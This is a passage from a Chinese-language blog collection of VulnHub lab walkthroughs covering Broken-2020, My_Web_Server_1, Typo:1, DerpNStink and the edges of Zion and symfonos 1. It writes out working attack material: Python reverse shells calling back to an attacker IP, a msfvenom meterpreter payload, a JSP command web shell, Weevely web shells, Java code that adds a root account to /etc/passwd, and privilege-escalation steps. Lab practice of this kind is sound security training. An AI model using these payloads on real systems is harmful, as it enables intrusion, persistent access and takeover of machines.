<h2 id="权限提升-21"><a class="markdownIt-Anchor" href="#权限提升-21"></a> 权限提升</h2>
<p>查看文件<code>warning.txt</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Zion/img/14.png" alt="" /></p>
<p>查看mail</p>
<p><img src="/images/vulnhub_walkthrough_set/Zion/img/15.png" alt="" /></p>
<p>查看sudu权限</p>
<p><img src="/images/vulnhub_walkthrough_set/Zion/img/16.png" alt="" /></p>
<p>使用sudo权限来进行复制flag文件</p>
<p><img src="/images/vulnhub_walkthrough_set/Zion/img/17.png" alt="" /></p>
<p>这里可以看到flag文件的权限为600<br />
需要在cp文件的同时更改权限，这里使用参数<code>--noreserve mode, ownership</code><br />
<img src="/images/vulnhub_walkthrough_set/Zion/img/18.png" alt="" /></p>
<p>查看flag</p>
<p><img src="/images/vulnhub_walkthrough_set/Zion/img/19.png" alt="" /></p>
<hr />
<blockquote>
<p>HTTP信息</p>
</blockquote>
<p>根据Post的内容不同，在HTTP Response的Header中给出不同的信息，在实现上并不是难事，思维上也能很快接受这一机制，但是由于之前没有碰到过这种情况，导致在这一步上卡了很久。所以在浏览网页时最好还是使用BurpSuite，以便更加直观地看到全部的信息</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=jzmaM-s2yEY">WalkThrough</a></p>
</blockquote>
<hr />
<h1 id="broken-2020"><a class="markdownIt-Anchor" href="#broken-2020"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/broken-2020-1,470/">Broken-2020</a></h1>
<p><code>2020/05/27 09:52:58</code></p>
<h2 id="寻找靶机ip-6"><a class="markdownIt-Anchor" href="#寻找靶机ip-6"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/00.png" alt="" /></p>
<h2 id="端口扫描-22"><a class="markdownIt-Anchor" href="#端口扫描-22"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.116</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/01.png" alt="" /></p>
<h2 id="web路径扫描-6"><a class="markdownIt-Anchor" href="#web路径扫描-6"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.31.116/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/02.png" alt="" /></p>
<h2 id="漏洞利用-22"><a class="markdownIt-Anchor" href="#漏洞利用-22"></a> 漏洞利用</h2>
<p>访问<code>http://192.168.31.116/</code>，无有效信息</p>
<p>访问<code>http://192.168.31.116/cms/</code>，如图</p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/03.png" alt="" /></p>
<p>根据指示点击按钮</p>
<p>再次访问<code>http://192.168.31.116/</code>，如图</p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/04.png" alt="" /></p>
<p>页面发生变化</p>
<p>再次访问<code>http://192.168.31.116/cms/</code>，如图</p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/05.png" alt="" /></p>
<p>获取第一个flag</p>
<p>尝试再次扫描Web目录</p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/06.png" alt="" /></p>
<p>访问新发现的目录<code>/cms/cc</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/07.png" alt="" /></p>
<p>尝试在端口输入处进行命令注入，失败</p>
<p>开启本地HTTP服务，再输入本地IP以及相应端口</p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/08.png" alt="" /></p>
<p>可以看到该页面在请求本地资源<code>1c66b2e0cff58bal7b3f9a1994eb8c55.sh</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/09.png" alt="" /></p>
<p>构造一个反弹Shell的文件，并且监听端口，再在burp中触发该文件</p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/10.png" alt="" /></p>
<p>目标机器上下载了该文件并且执行了，接收到反弹Shell</p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/11.png" alt="" /></p>
<h2 id="权限提升-22"><a class="markdownIt-Anchor" href="#权限提升-22"></a> 权限提升</h2>
<p>查看目录<code>/home/alice</code>下的文本文件</p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/12.png" alt="" /></p>
<p>这里提示root在后台运行清除apache日志的脚本，很存在crontab提权</p>
<p>下载pspy64</p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/13.png" alt="" /></p>
<p>crontab运行任务如图，可以从<code>/home/alice/script/log.py</code>处入手</p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/14.png" alt="" /></p>
<p>可以看到这个script目录所有人可写</p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/15.png" alt="" /></p>
<p>即使文件log.py不可写，但是可以凭借目录的权限去修改文件名</p>
<p>本地构造Meterpreter的后门程序<br />
<code>msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9993 -f raw &gt; new.py</code></p>
<p>MSFConsole中进行相应配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload python&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9993</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>下载本地的后门程序，并且对文件名进行操作</p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/16.png" alt="" /></p>
<p>接收到反弹shell，进入目录<code>/home/alice/backup/</code><br />
查看所有文本文件</p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/17.png" alt="" /></p>
<p>运行pspy64，<a target="_blank" rel="noopener" href="http://xn--rootbackup-oh4pe03a8zfg4mfr4dhdohx0cr3zb6t2aoo5a.py">可以看到root正在运行脚本backup.py</a></p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/18.png" alt="" /></p>
<p>将web目录输入至path.txt</p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/19.png" alt="" /></p>
<p>可以看到html文件夹被备份到了该目录下<br />
而且权限均为777</p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/20.png" alt="" /></p>
<p>尝试打包目录<code>/root/</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/21.png" alt="" /></p>
<p>查看文件夹root下的内容</p>
<p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/22.png" alt="" /></p>
<hr />
<blockquote>
<p>目录权限&amp;crontab</p>
</blockquote>
<p>看着log.py的744权限也是有心无力，参考别人的WalkThrough之后才发现是目录的权限问题。目录可写则可以任意修改目录下的文件名，配合crontab则可以提权。</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://medium.com/@arnavtripathy98/broken-2020-1-vulnhub-walkthrough-43293614944a">WalkThrough</a></p>
</blockquote>
<hr />
<h1 id="my_web_server_1"><a class="markdownIt-Anchor" href="#my_web_server_1"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/my-web-server-1,463/">My_Web_Server_1</a></h1>
<p><code>2020/06/03 19:12:46</code></p>
<h2 id="寻找靶机ip-7"><a class="markdownIt-Anchor" href="#寻找靶机ip-7"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/00.png" alt="" /></p>
<h2 id="端口扫描-23"><a class="markdownIt-Anchor" href="#端口扫描-23"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.203</code></p>
<p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/01.png" alt="" /></p>
<h2 id="web路径扫描-7"><a class="markdownIt-Anchor" href="#web路径扫描-7"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.31.203/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/02.png" alt="" /></p>
<p><code>dirb http://192.168.31.203:2222/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/03.png" alt="" /></p>
<p><code>dirb http://192.168.31.203:8080/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/04.png" alt="" /></p>
<p><code>dirb http://192.168.31.203:8081/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/05.png" alt="" /></p>
<h2 id="漏洞利用-23"><a class="markdownIt-Anchor" href="#漏洞利用-23"></a> 漏洞利用</h2>
<p>可以看到有三个Web入口，端口分别是80,2222,8080,8081<br />
2222端口上运行的是nostromo服务，使用searchsploit查看相关漏洞</p>
<p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/06.png" alt="" /></p>
<p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/07.png" alt="" /></p>
<p>存在RCE漏洞，在MSF中进行配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;http&#x2F;nostromo_code_exec</span><br><span class="line">set RHOSTS 192.168.31.203</span><br><span class="line">set RPORT 2222</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>即可获得权限</p>
<h2 id="权限提升-23"><a class="markdownIt-Anchor" href="#权限提升-23"></a> 权限提升</h2>
<p>查看tomcat的Web账户</p>
<p><code>cat /usr/local/tomcat/conf/tomcat-users.xml</code><br />
<img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/08.png" alt="" /></p>
<p>访问<code>http://192.168.31.203:8080/</code>,点击<code>Manager App</code></p>
<p>使用账户<code>tomcat:@sprot0230sp</code>进行登入</p>
<p>将jsp后门压缩为zip并更改后缀名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip war.zip echo.jsp</span><br><span class="line">mv war.zip war.war</span><br></pre></td></tr></table></figure>
<p>登入tomcat的Web账户，上传jsp后门</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;pass&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>利用原有的Shell构造python反弹Shell脚本<br />
找一个可写目录<code>/var/nostromo/logs/</code>，<a target="_blank" rel="noopener" href="http://xn--new-0v1e9ip79iu61b.py">写入脚本new.py</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os,socket,subprocess;</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((&#39;192.168.31.10&#39;,8081));</span><br><span class="line">os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);</span><br><span class="line">p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);</span><br></pre></td></tr></table></figure>
<p>本地启用nc监听端口<br />
<code>nc -lvvp 8081</code></p>
<p>访问jsp后门以执行命令<br />
<code>http://192.168.31.203:8080/war/echo.jsp?pwd=pass&amp;i=python /var/nostromo/logs/new.py</code></p>
<p>接收到反弹的tomcat用户Shell</p>
<p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/09.png" alt="" /></p>
<p>这里看到有bash的记录</p>
<p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/10.png" alt="" /></p>
<p>使用过命令sudo -l</p>
<p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/11.png" alt="" /></p>
<p>可以使用java进行sudo提权</p>
<p>本地构造java源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class sudo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ProcessBuilder processBuilder &#x3D; new ProcessBuilder();</span><br><span class="line">    processBuilder.command(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;echo &#39;test:$6$q.1oPln23FUPQYds$pRZlkAKZ6tN.N4c5kUCKsCF.QW1kdbnLGLTpI3XKgidZuHzbxZzjdONAzoTHgfJHh9NU2E0pO32ICFc5zL78.&#x2F;:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Process process &#x3D; processBuilder.start();</span><br><span class="line">            BufferedReader reader &#x3D;</span><br><span class="line">                    new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; reader.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            int exitCode &#x3D; process.waitFor();</span><br><span class="line">            System.out.println(&quot;\nExited with error code : &quot; + exitCode);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>即写入账户test:hackforfun</p>
<p>本地启用HTTP服务<br />
<code>python -m SimpleHTTPServer 9900 &amp;</code></p>
<p>目标服务器上下载源码<br />
<code>wget http://192.168.31.10:9900/sudo.java</code></p>
<p>编译并执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac sudo.java</span><br><span class="line">sudo -u root &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;adoptopenjdk-8-hotspot-amd64&#x2F;bin&#x2F;java sudo</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/12.png" alt="" /></p>
<p>成功写入账户信息</p>
<p>获取pty<br />
<code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p>
<p>切换账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">hackforfun</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/13.png" alt="" /></p>
<hr />
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=eOVm2G1sX4o">WalkThrough</a></p>
</blockquote>
<hr />
<h1 id="typo1"><a class="markdownIt-Anchor" href="#typo1"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/typo-1,472/">Typo:1</a></h1>
<p><code>2020/06/09 21:51:36</code></p>
<h2 id="寻找靶机ip-8"><a class="markdownIt-Anchor" href="#寻找靶机ip-8"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/00.png" alt="" /></p>
<h2 id="端口扫描-24"><a class="markdownIt-Anchor" href="#端口扫描-24"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.26</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/01.png" alt="" /></p>
<h2 id="web路径扫描-8"><a class="markdownIt-Anchor" href="#web路径扫描-8"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.31.26/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/02.png" alt="" /></p>
<p><code>dirb http://192.168.31.26:8000/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/03.png" alt="" /></p>
<p><code>dirb http://192.168.31.26:8080/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/04.png" alt="" /></p>
<p><code>dirb http://192.168.31.26:8081/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/05.png" alt="" /></p>
<h2 id="漏洞利用-24"><a class="markdownIt-Anchor" href="#漏洞利用-24"></a> 漏洞利用</h2>
<p>访问<code>http://192.168.31.26/typo3/</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/06.png" alt="" /></p>
<p>访问<code>http://192.168.31.26:8080/phpinfo.php</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/07.png" alt="" /></p>
<p>访问<code>http://192.168.31.26:8081/phpmyadmin/</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/08.png" alt="" /></p>
<p>phpmyadmin存在弱口令<code>root:root</code></p>
<p>登入后查看数据库，typo3对应80端口的Web服务</p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/09.png" alt="" /></p>
<p>可以替换表中的Hash值来获取账号权限</p>
<p>访问 <a target="_blank" rel="noopener" href="https://argon2.online/">https://argon2.online/</a> 生成Hash</p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/10.png" alt="" /></p>
<p><code>$argon2id$v=19$m=65536,t=16,p=2$MTIzNDU2Nzg$zsu3+i7HptpLzboB2NgkoqXdFnY1sfu2muwr4LFIbGo</code></p>
<p>替换Hash值之后登入Typo3后台，CMS设定中不允许上传php文件</p>
<p><code>Module Menu -&gt; ADMIN TOOLS -&gt; Settings -&gt; Configure Installation-Wide Options -&gt; Backend[BE] -&gt; [BE][fileDenyPattern]</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/11.png" alt="" /></p>
<p>清除内容即可解除对于文件上传的限制</p>
<p>使用weevely生成WebShell</p>
<p><code>weevely generate pass wee.php</code></p>
<p>上传WebShell</p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/12.png" alt="" /></p>
<p>访问Shell</p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/13.png" alt="" /></p>
<p>连接Shell</p>
<p><code>weevely http://192.168.31.26/fileadmin/wee.php pass</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/14.png" alt="" /></p>
<h2 id="权限提升-24"><a class="markdownIt-Anchor" href="#权限提升-24"></a> 权限提升</h2>
<p>使用python反弹Shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.31.10&#39;,8081));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/15.png" alt="" /></p>
<p>获取pty</p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/16.png" alt="" /></p>
<p>查看具有SUID权限的文件</p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/17.png" alt="" /></p>
<p>这里的<code>/usr/local/bin</code>路劲下的文件明显是不对劲的</p>
<p>apache2-restart为ELF文件</p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/18.png" alt="" /></p>
<p>使用strings命令查看文件字符</p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/19.png" alt="" /></p>
<p>使用的是service命令</p>
<p>进行PATH提权</p>
<p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/20.png" alt="" /></p>
<hr />
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://medium.com/@arnavtripathy98/typo-1-vulnhub-walkthrough-ecd2971da7f8">WalkThrough</a></p>
</blockquote>
<hr />
<h1 id="derpnstink"><a class="markdownIt-Anchor" href="#derpnstink"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/derpnstink-1,221/">DerpNStink</a></h1>
<p><code>2020/06/22 14:53:48</code></p>
<h2 id="寻找靶机ip-9"><a class="markdownIt-Anchor" href="#寻找靶机ip-9"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 VMware</code></p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/00.png" alt="" /></p>
<h2 id="端口扫描-25"><a class="markdownIt-Anchor" href="#端口扫描-25"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.61</code></p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/01.png" alt="" /></p>
<h2 id="web路径扫描-9"><a class="markdownIt-Anchor" href="#web路径扫描-9"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.31.61/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/02.png" alt="" /></p>
<h2 id="漏洞利用-25"><a class="markdownIt-Anchor" href="#漏洞利用-25"></a> 漏洞利用</h2>
<p>目录/weblog/设置了302跳转并指向了一个域名，需要修改hosts文件</p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/03.png" alt="" /></p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/04.png" alt="" /></p>
<p>使用Wordpress框架，可以使用wpscan进行扫描</p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/05.png" alt="" /></p>
<p><code>wpscan --url http://derpnstink.local/weblog/ -e u</code></p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/06.png" alt="" /></p>
<p><code>wpscan --url http://derpnstink.local/weblog/ -e ap</code></p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/07.png" alt="" /></p>
<p>查找插件相关信息<br />
<code>searchsploit slideshow gallery 1.4.6</code></p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/08.png" alt="" /></p>
<p>拷贝文件<br />
<code>searchsploit -m 34681</code></p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/09.png" alt="" /></p>
<p>需要Wordpress的账户</p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/10.png" alt="" /></p>
<p>尝试弱口令得到账户<code>admin:admin</code></p>
<p>生成php后门<br />
<code>weevely generate pass wee.php</code></p>
<p>使用脚本上传后门<br />
<code>python 34681.txt -t http://derpnstink.local/weblog/ -u admin -p admin -f wee.php</code></p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/11.png" alt="" /></p>
<p>连接后门<br />
<code>weevely http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/wee.php pass</code></p>
<p>python反弹Shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8081</span><br><span class="line">-----</span><br><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.31.10&#39;,8081));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/12.png" alt="" /></p>
<h2 id="权限提升-25"><a class="markdownIt-Anchor" href="#权限提升-25"></a> 权限提升</h2>
<p>获取pty</p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/13.png" alt="" /></p>
<p>查看Wordpress配置信息<br />
<code>cat /var/www/html/weblog/wp-config.php</code></p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/14.png" alt="" /></p>
<p>得到unclestinky的密码Hash<br />
<img src="/images/vulnhub_walkthrough_set/DerpNStink/img/15.png" alt="" /></p>
<p>使用john破解Hash<br />
<code>john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hash</code></p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/16.png" alt="" /></p>
<p>得到密码</p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/17.png" alt="" /><br />
<code>stinky:wedgie57</code></p>
<p>尝试切换账户，成功</p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/18.png" alt="" /></p>
<p>找到mrderp与stinky的对话</p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/19.png" alt="" /></p>
<p>尝试寻找流量包</p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/20.png" alt="" /></p>
<p>开启http服务，下载至本地</p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/21.png" alt="" /></p>
<p>使用wireshark分析流量</p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/22.png" alt="" /><br />
<code>mrderp:derpderpderpderpderpderpderp</code></p>
<p>切换至用户mrderp</p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/23.png" alt="" /></p>
<p>查看文件<br />
<code>cat /home/mrderp/Desktop/helpdesk.log</code></p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/24.png" alt="" /></p>
<p>访问链接</p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/25.png" alt="" /></p>
<p>查看sudo权限</p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/26.png" alt="" /></p>
<p>可以进行sudo提权</p>
<p>上传python反弹Shell脚本</p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/27.png" alt="" /></p>
<p>提权为root</p>
<p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/28.png" alt="" /></p>
<hr />
<blockquote>
<p>密码共用</p>
</blockquote>
<p><s>太常规了</s></p>
<hr />
<h1 id="symfonos-1"><a class="markdownIt-Anchor" href="#symfonos-1"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/symfonos-1,322/">symfonos 1</a></h1>
<p><code>2020/06/27 00:25:29</code></p>
<h2 id="寻找靶机ip-10"><a class="markdownIt-Anchor" href="#寻找靶机ip-10"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.88.0/24 | grep -B2 VMware</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/00.png" alt="" /></p>
<h2 id="端口扫描-26"><a class="markdownIt-Anchor" href="#端口扫描-26"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.88.130</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/01.png" alt="" /></p>
<h2 id="web路径扫描-10"><a class="markdownIt-Anchor" href="#web路径扫描-10"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.88.130/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/02.png" alt="" /></p>
<h2 id="漏洞利用-26"><a class="markdownIt-Anchor" href="#漏洞利用-26"></a> 漏洞利用</h2>
<p>收集smb信息<br />
<code>enum4linux 192.168.88.130</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/03.png" alt="" /></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/04.png" alt="" /></p>
<p>目录/anonymous可以匿名访问<br />
使用空账户即可登入</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/05.png" alt="" /></p>
<p>下载并查看<code>attention.txt</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/06.png" alt="" /></p>
<p>文本中提到三个弱口令，可以使用这三个弱口令来尝试登入helios账户的个人目录<br />
<code>smbclint //192.168.88.130/helios -U helios</code><br />
